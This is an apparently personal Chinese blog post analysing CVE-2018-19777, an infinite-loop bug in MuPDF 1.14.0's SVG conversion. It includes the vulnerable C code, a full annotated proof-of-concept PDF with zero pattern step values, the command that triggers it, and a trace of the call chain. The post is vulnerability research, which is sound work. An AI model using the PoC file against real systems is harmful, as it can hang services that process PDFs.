<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://ppcrab.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://ppcrab.github.io/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">



   <a href="https://github.com/you"><img style="position: absolute; top: 0; right: 0; border: 0;"  src="https://ppcrab.github.io/" alt="Fork me on  GitHub"></a>
   






  
  
    
  
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-music">
          <a href="/music" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
            
            喜欢的一些音乐
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
            
            我读过的一些书籍以及笔记
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2020/02/09/CVE-2018-19777分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/09/CVE-2018-19777分析/" itemprop="url">CVE-2018-19777分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-09T22:13:18+08:00">
                2020-02-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  2.8k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  13
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>好久没写过blog了。。。。</p>
<h4 id="CVE-2018-19777"><a href="#CVE-2018-19777" class="headerlink" title="CVE-2018-19777"></a>CVE-2018-19777</h4><h5 id="软件简介"><a href="#软件简介" class="headerlink" title="软件简介"></a>软件简介</h5><p>mupdf为一开源的pdf查看、编辑软件，也可用来进行与其他格式如svg、XPS的文件进行转换</p>
<p>简介：</p>
<p><a href="https://www.mupdf.com/index.html" target="_blank" rel="noopener">https://www.mupdf.com/index.html</a></p>
<p>各版本下载链接</p>
<p><a href="https://mupdf.com/downloads/" target="_blank" rel="noopener">https://mupdf.com/downloads/</a></p>
<h5 id="漏洞code分析"><a href="#漏洞code分析" class="headerlink" title="漏洞code分析"></a>漏洞code分析</h5><p>此cve为infinite loop，即无限循环</p>
<p>code为mupdf 1.14.0 中函数 <strong>svg_dev_end_tile</strong>内部</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w = t-&gt;view.x1 - t-&gt;view.x0;</span><br><span class="line">h = t-&gt;view.y1 - t-&gt;view.y0;</span><br><span class="line"></span><br><span class="line">for (x = 0; x &gt; -w; x -= t-&gt;step.x)</span><br><span class="line">		for (y = 0; y &gt; -h; y -= t-&gt;step.y)</span><br><span class="line">			fz_write_printf(ctx, out, &quot;&lt;use x=\&quot;%g\&quot; y=\&quot;%g\&quot; xlink:href=\&quot;#pac%d\&quot;/&gt;\n&quot;, x, y, t-&gt;pattern);</span><br></pre></td></tr></table></figure>
<p>可以看得出此处t-&gt;step.x，t-&gt;step.y若为0，则会出现无限循环</p>
<p>poc的运行结果图如下</p>
<p><img src="/2020/02/09/CVE-2018-19777分析/1581233244101.png" alt="1581233244101"></p>
<p><img src="/2020/02/09/CVE-2018-19777分析/1581232926334.png" alt="1581232926334"></p>
<p>显而易见，达到了利用效果，但是如何利用的呢？</p>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>结合漏洞代码上方注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* All the pattern contents will have their own ctm applied. Let&apos;s</span><br><span class="line">	 * undo the current one to allow for this */</span><br><span class="line">	 //CTM(current transformation matrixs)</span><br></pre></td></tr></table></figure>
<p>以及变量的名称t-&gt; step.x，t-&gt;step.y，函数名称<strong>svg_dev_end_tile</strong></p>
<p>在大体了解了pdf格式后结合文档可以可以定位到文档的8.7节Patterns，以及表Table 75</p>
<p><img src="/2020/02/09/CVE-2018-19777分析/1581232538986.png" alt="1581232538986"></p>
<p>可以看到，pdf1.7中明确指出了XStep与 YStep不可为0</p>
<p>在poc中加入这两个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">14 0 obj &lt;&lt;</span><br><span class="line">  /PatternType 1</span><br><span class="line">  /BBox [0 0 225 161]</span><br><span class="line">  /XStep 100</span><br><span class="line">  /YStep 100</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2020/02/09/CVE-2018-19777分析/1581233332532.png" alt="1581233332532"></p>
<p><img src="/2020/02/09/CVE-2018-19777分析/1581233044127.png" alt="1581233044127"></p>
<p>说明猜测是正确的</p>
<p>mupdf在转换时并没有十分严格的遇到不合格的pdf就停止，而是继续运行，所以出现了pdf文档中禁止的参数数值出现的情况</p>
<h5 id="poc分析-amp-pdf格式简单分析"><a href="#poc分析-amp-pdf格式简单分析" class="headerlink" title="poc分析&amp;pdf格式简单分析"></a>poc分析&amp;pdf格式简单分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.7//pdf的文件头，标识了版本号为1.7</span><br><span class="line">%狉//以下为pdf的主体即一堆object  &lt;&lt; &gt;&gt;内的为其内容</span><br><span class="line">1 0 obj &lt;&lt; // 1的意义为obj的序号，0代表经过改动的次数，但是现在好像都是0</span><br><span class="line">  /Kids [3 0 R] //kids对象说明它的子页对象为3，这里的x 0 R;出现了关键字R即为一i你用x序列号的对象</span><br><span class="line">  /Type /Pages  //这个对象的类型为页pages</span><br><span class="line">  /Count 1      //count 说明页码数量为1</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj         //对象结束</span><br><span class="line">2 0 obj &lt;&lt;</span><br><span class="line">  /Type /Catalog  //对象类型为目录catalog</span><br><span class="line">  /Pages 1 -3617168 R  //1号对象为pages类型，这里的-3617168很奇怪，但是将其改为其他的数字并不影响这个poc，所以并不是这里的问题</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">3 0 obj &lt;&lt;</span><br><span class="line">  /Resources 11 0 R //该页包含的资源，因为有一些无法用直接对象直接表述的内容，但是内容流Steam中又无法出现间接对象，所以出现了一些Name Resources</span><br><span class="line">  /Type /Page</span><br><span class="line">  /Contents 10 0 R  //内容为 序号10的对象 </span><br><span class="line">  /Parent 1 0 R	    //父对象为1</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">10 0 obj &lt;&lt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">1 0 0 1 315.779 733.039 cm</span><br><span class="line">1 0 255 1 2.835 -173.614 cm</span><br><span class="line">1.04704 0 0 1.04704 0 0 cm     //通过连接指定的矩阵来修改当前的转换矩，stream中涉及到的算法并没有研究。此部分为文档中的8.44</span><br><span class="line">/Im6 Do //下述命名资源的引用</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">11 0 obj &lt;&lt;        //Name Resources有 (指令集)Procset、(字体) Font 、(色彩空间)Color space、(外部对象)XObject、(拓展的图形状态)Extended graphic state、(底纹)Pattern、用户拓展标记列表(Property list)</span><br><span class="line">  /XObject &lt;&lt;</span><br><span class="line">    /Im6 12 0 R    //12号对象命名为Im6</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">12 0 obj &lt;&lt;</span><br><span class="line">  /Subtype /Form   //表示显示的内容为表格类型的，或者说方框，例如批注的方框</span><br><span class="line">  /Resources &lt;&lt;    //这里不得不说明一下，&lt;&lt;&gt;&gt;为字典类型</span><br><span class="line">    /XObject &lt;&lt;</span><br><span class="line">      /x15 13 0 R</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">/x15 Do</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">13 0 obj &lt;&lt;</span><br><span class="line">  /Subtype /Form</span><br><span class="line">  /Resources &lt;&lt;</span><br><span class="line">    /Pattern &lt;&lt;</span><br><span class="line">      /p31 14 0 R</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">q /Pattern cs /p31 scn /a0 gs</span><br><span class="line">0 1 224.720001 160.399994 re f  //这里的数据a,b,c,d 对t-&gt;area 产生了影响，t-&gt;area.x0=-25500;t-&gt;area.y0 = b;t-&gt;area.x1 = 25500+c;t-&gt;area.y1 = d; </span><br><span class="line">								//re 是路径构造运算符在当前路径上附加一个矩形作为完整的子路径，左下角（x，y）和任意的用户空间中的高度和宽度。</span><br><span class="line">								//f : 路径绘制fill the path,using the nonzero winding number rule to determine the region to fill.</span><br><span class="line">								//Any subpaths that are open shall be implictly closed before being filled（填充路径，使用非零卷绕数规则确定要填充的区域。</span><br><span class="line">								任何打开的子路径在填充之前都应隐式关闭）</span><br><span class="line">Q</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">14 0 obj &lt;&lt;</span><br><span class="line">  /PatternType 1</span><br><span class="line">  /BBox [0 0 225 161] //方框 两边为225、161 units .此四项数据a,b,c,d与code的对应关系为：t-&gt;view.x0=a,t-&gt;view.y0 = b,t-&gt;view.x1=c,t-&gt;view.y1=d;</span><br><span class="line">						//XStep and YStep may be either positive or negative but shall not be zero.程序载入的时候会取绝对值</span><br><span class="line">						//在文档中可以看得出这部分有参数名为 XStep、YStep。而且特别标注了不可以是0，因为当是0时确实没有什么用，它本身就是用来进行不同设备之间的像素缩放时用到的一个标量。</span><br><span class="line">  /Resources &lt;&lt;									  </span><br><span class="line">  /XObject &lt;&lt;</span><br><span class="line">      /x47 12 0 R</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &gt;&gt;					</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">/x47 Do</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref  //xref，交叉引用表</span><br><span class="line">0 15</span><br><span class="line">0000000000 65535 f //一般pdf都是以这行开始交叉引用表的，起始地址0和产生号</span><br><span class="line">0000000015 00000 n //表示对象1，15为偏移地址n表示对象在使用</span><br><span class="line">0000000078 00000 n </span><br><span class="line">0000000131 00000 n </span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000000 1 f </span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000221 00000 n </span><br><span class="line">0000000348 00000 n </span><br><span class="line">0000000405 00000 n </span><br><span class="line">0000000531 00000 n </span><br><span class="line">0000000712 00000 n </span><br><span class="line">trailer &lt;&lt;            //整个xref的简单摘要</span><br><span class="line">  /Root 2 0 R          //这里也是为什么2号对象是目录类型的原因</span><br><span class="line">  /Size 110   		  //obj的数目，此poc并没有考虑到这里的正确性，因为漏洞位置之前代码检测完并没有直接退出，而是多了个“trying to repair broken xref”</span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">860</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>
<h5 id="函数调用过程分析"><a href="#函数调用过程分析" class="headerlink" title="函数调用过程分析"></a>函数调用过程分析</h5><p>这一部分比较复杂而且并没有影响到这个cve的整体分析，所以此部分完成的不是太好，尽力了</p>
<p>在<strong>svg_dev_end_tile</strong>内</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svg_device *sdev = (svg_device*)dev;</span><br><span class="line">.....</span><br><span class="line">t = &amp;sdev-&gt;tiles[num];</span><br></pre></td></tr></table></figure>
<p>其中t的结构体为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct tile_s</span><br><span class="line">&#123;</span><br><span class="line">	int pattern;</span><br><span class="line">	fz_matrix ctm;</span><br><span class="line">	fz_rect view;</span><br><span class="line">	fz_rect area;</span><br><span class="line">	fz_point step;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>svg_device 的结构体为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct svg_device_s</span><br><span class="line">&#123;</span><br><span class="line">	fz_device super;</span><br><span class="line"></span><br><span class="line">	int text_as_text;</span><br><span class="line">	int reuse_images;</span><br><span class="line"></span><br><span class="line">	fz_output *out;</span><br><span class="line">	fz_output *out_store;</span><br><span class="line">	fz_output *defs;</span><br><span class="line">	fz_buffer *defs_buffer;</span><br><span class="line">	int def_count;</span><br><span class="line"></span><br><span class="line">	int id;</span><br><span class="line"></span><br><span class="line">	int num_tiles;</span><br><span class="line">	int max_tiles;</span><br><span class="line">	tile *tiles;</span><br><span class="line"></span><br><span class="line">	int num_fonts;</span><br><span class="line">	int max_fonts;</span><br><span class="line">	font *fonts;</span><br><span class="line"></span><br><span class="line">	int num_images;</span><br><span class="line">	int max_images;</span><br><span class="line">	image *images;</span><br><span class="line"></span><br><span class="line">	int layers;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>svg_dev_end_tile</strong>在<strong>fz_new_svg_device</strong>内成为了函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">fz_device *fz_new_svg_device(fz_context *ctx, fz_output *out, float page_width, float page_height, int text_format, int reuse_images)</span><br><span class="line">&#123;</span><br><span class="line">	svg_device *dev = fz_new_derived_device(ctx, svg_device);</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.close_device = svg_dev_close_device;</span><br><span class="line">	dev-&gt;super.drop_device = svg_dev_drop_device;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.fill_path = svg_dev_fill_path;</span><br><span class="line">	dev-&gt;super.stroke_path = svg_dev_stroke_path;</span><br><span class="line">	dev-&gt;super.clip_path = svg_dev_clip_path;</span><br><span class="line">	dev-&gt;super.clip_stroke_path = svg_dev_clip_stroke_path;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.fill_text = svg_dev_fill_text;</span><br><span class="line">	dev-&gt;super.stroke_text = svg_dev_stroke_text;</span><br><span class="line">	dev-&gt;super.clip_text = svg_dev_clip_text;</span><br><span class="line">	dev-&gt;super.clip_stroke_text = svg_dev_clip_stroke_text;</span><br><span class="line">	dev-&gt;super.ignore_text = svg_dev_ignore_text;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.fill_shade = svg_dev_fill_shade;</span><br><span class="line">	dev-&gt;super.fill_image = svg_dev_fill_image;</span><br><span class="line">	dev-&gt;super.fill_image_mask = svg_dev_fill_image_mask;</span><br><span class="line">	dev-&gt;super.clip_image_mask = svg_dev_clip_image_mask;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.pop_clip = svg_dev_pop_clip;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.begin_mask = svg_dev_begin_mask;</span><br><span class="line">	dev-&gt;super.end_mask = svg_dev_end_mask;</span><br><span class="line">	dev-&gt;super.begin_group = svg_dev_begin_group;</span><br><span class="line">	dev-&gt;super.end_group = svg_dev_end_group;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.begin_tile = svg_dev_begin_tile;</span><br><span class="line">	dev-&gt;super.end_tile = svg_dev_end_tile;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.begin_layer = svg_dev_begin_layer;</span><br><span class="line">	dev-&gt;super.end_layer = svg_dev_end_layer;</span><br><span class="line"></span><br><span class="line">	dev-&gt;super.hints |= FZ_MAINTAIN_CONTAINER_STACK;</span><br><span class="line"></span><br><span class="line">	dev-&gt;out = out;</span><br><span class="line">	dev-&gt;out_store = out;</span><br><span class="line">	dev-&gt;id = 0;</span><br><span class="line">	dev-&gt;layers = 0;</span><br><span class="line">	dev-&gt;text_as_text = (text_format == FZ_SVG_TEXT_AS_TEXT);</span><br><span class="line">	dev-&gt;reuse_images = reuse_images;</span><br><span class="line"></span><br><span class="line">	fz_write_printf(ctx, out, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot; standalone=\&quot;no\&quot;?&gt;\n&quot;);</span><br><span class="line">	fz_write_printf(ctx, out, &quot;&lt;!DOCTYPE svg PUBLIC \&quot;-//W3C//DTD SVG 1.1//EN\&quot; \&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\&quot;&gt;\n&quot;);</span><br><span class="line">	fz_write_printf(ctx, out, &quot;&lt;svg xmlns=\&quot;http://www.w3.org/2000/svg\&quot; &quot;</span><br><span class="line">		&quot;xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; version=\&quot;1.1\&quot; &quot;</span><br><span class="line">		&quot;width=\&quot;%gpt\&quot; height=\&quot;%gpt\&quot; viewBox=\&quot;0 0 %g %g\&quot;&gt;\n&quot;,</span><br><span class="line">		page_width, page_height, page_width, page_height);</span><br><span class="line"></span><br><span class="line">	return (fz_device*)dev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的上层引用为</p>
<p>函数<strong>svg_begin_page</strong></p>
<p>函数<strong>fz_new_derived_document_writer</strong>//新生成的文件空间申请以及调用函数，构造函数指针列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fz_new_derived_document_writer(CTX,TYPE,BEGIN_PAGE,END_PAGE,CLOSE,DROP) \</span></span><br><span class="line">	((TYPE *)Memento_label(fz_new_document_writer_of_size(CTX,<span class="keyword">sizeof</span>(TYPE),BEGIN_PAGE,END_PAGE,CLOSE,DROP),#TYPE))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wri-&gt;begin_page = begin_page;<span class="comment">//这里的begin_page即作为参数传入的svg_begin_page</span></span><br></pre></td></tr></table></figure>
<p>函数<strong>fz_new_svg_writer</strong> //新生成文件创建</p>
<p>函数<strong>fz_new_document_writer</strong>//文件类型判断，返回一个<strong>fz_document_writer</strong> 结构体指针</p>
<p>函数<strong>muconvert_main</strong> 即进行pdf转svg的命令  <em>mutool.exe convert -o text.svg .\Infinite_loop_convert_svg</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fz_try(ctx)</span><br><span class="line">		out = fz_new_document_writer(ctx, output, format, options);</span><br><span class="line">	fz_catch(ctx)</span><br><span class="line">	&#123;</span><br><span class="line">		fprintf(stderr, &quot;cannot create document: %s\n&quot;, fz_caught_message(ctx));</span><br><span class="line">		fz_drop_context(ctx);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (i = fz_optind; i &lt; argc; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		doc = fz_open_document(ctx, argv[i]);</span><br><span class="line">		if (fz_needs_password(ctx, doc))</span><br><span class="line">			if (!fz_authenticate_password(ctx, doc, password))</span><br><span class="line">				fz_throw(ctx, FZ_ERROR_GENERIC, &quot;cannot authenticate password: %s&quot;, argv[i]);</span><br><span class="line">		fz_layout_document(ctx, doc, layout_w, layout_h, layout_em);</span><br><span class="line">		count = fz_count_pages(ctx, doc);</span><br><span class="line"></span><br><span class="line">		if (i+1 &lt; argc &amp;&amp; fz_is_page_range(ctx, argv[i+1]))</span><br><span class="line">			runrange(argv[++i]);//函数调用</span><br><span class="line">		else</span><br><span class="line">			runrange(&quot;1-N&quot;);</span><br><span class="line"></span><br><span class="line">		fz_drop_document(ctx, doc);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>另一方面<strong>runrange</strong>内调用了之前赋值的函数指针</p>
